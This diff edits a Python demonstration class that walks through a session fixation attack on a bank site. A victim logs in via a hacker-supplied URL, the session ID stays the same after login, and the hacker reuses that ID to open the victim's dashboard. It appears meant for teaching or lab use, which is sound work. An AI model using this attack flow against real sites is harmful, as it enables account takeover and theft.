@@ -59,11 +59,12 @@ class BankSessionFixationDemo:
         print(f"Victim visits: {response.url}")
         print(f"Status: {response.status_code}")
         
-        # Check if victim got the same session ID
+        # Check if victim got the same session ID as hacker
         session_cookies = [name for name in self.victim_session.cookies.keys() if 'session' in name.lower()]
         if session_cookies:
             session_id = self.victim_session.cookies[session_cookies[0]]
             print(f"🎯 Victim now has session ID: {session_id}")
+            print(f"📝 This should be the same session ID the hacker captured from the bank")
             return session_id
         else:
             print("❌ No session cookie found")
@@ -79,24 +80,39 @@ class BankSessionFixationDemo:
             'password': password
         }
         
-        response = self.victim_session.post(
-            f"{self.hacker_url}/login",
-            data=login_data,
-            allow_redirects=True
-        )
-        
-        print(f"Victim logs in as: {username}")
-        print(f"Status: {response.status_code}")
-        print(f"Final URL: {response.url}")
-        
-        # Check session ID after login
-        session_cookies = [name for name in self.victim_session.cookies.keys() if 'session' in name.lower()]
-        if session_cookies:
-            session_id = self.victim_session.cookies[session_cookies[0]]
-            print(f"🎯 Session ID after login: {session_id}")
-            return session_id
-        else:
-            print("❌ No session cookie after login")
+        try:
+            response = self.victim_session.post(
+                f"{self.hacker_url}/login",
+                data=login_data,
+                allow_redirects=True
+            )
+            
+            print(f"Victim logs in as: {username}")
+            print(f"Status: {response.status_code}")
+            print(f"Final URL: {response.url}")
+            
+            # Check session ID after login - it should remain the same
+            session_cookies = [name for name in self.victim_session.cookies.keys() if 'session' in name.lower()]
+            if session_cookies:
+                # Get all session cookies and use the first one
+                all_session_cookies = [self.victim_session.cookies[cookie] for cookie in session_cookies]
+                session_id = all_session_cookies[0]  # Use the first session cookie
+                print(f"🎯 Session ID after login: {session_id}")
+                print(f"📝 This session ID should NOT change after login (vulnerable!)")
+                return session_id
+            else:
+                print("❌ No session cookie after login")
+                return None
+                
+        except Exception as e:
+            print(f"Error during login: {e}")
+            # Try to get session ID even if there's an error
+            session_cookies = [name for name in self.victim_session.cookies.keys() if 'session' in name.lower()]
+            if session_cookies:
+                all_session_cookies = [self.victim_session.cookies[cookie] for cookie in session_cookies]
+                session_id = all_session_cookies[0]
+                print(f"🎯 Session ID after login (recovered): {session_id}")
+                return session_id
             return None
     
     def step5_hacker_accesses_victim_bank_account(self, bank_session_id):
@@ -104,8 +120,8 @@ class BankSessionFixationDemo:
         print(f"\n🎯 STEP 5: Hacker accesses victim's bank account")
         print("=" * 60)
         
-        # Hacker uses the bank session ID to access victim's account
-        # The hacker should use the session ID that the victim used to log in
+        # Hacker uses the same session ID that the victim used
+        # This should be the session ID from the bank that the victim unknowingly used
         response = self.hacker_session.get(f"{self.bank_url}/bank/dashboard")
         
         print(f"Hacker accesses bank dashboard: {response.url}")
@@ -160,7 +176,7 @@ class BankSessionFixationDemo:
         # Analysis
         print(f"\n🔍 ATTACK ANALYSIS")
         print("=" * 40)
-        print(f"Bank session ID: {bank_session_id}")
+        print(f"Bank session ID (hacker's): {bank_session_id}")
         print(f"Victim session ID: {victim_session_id}")
         print(f"Session ID after login: {login_session_id}")
         
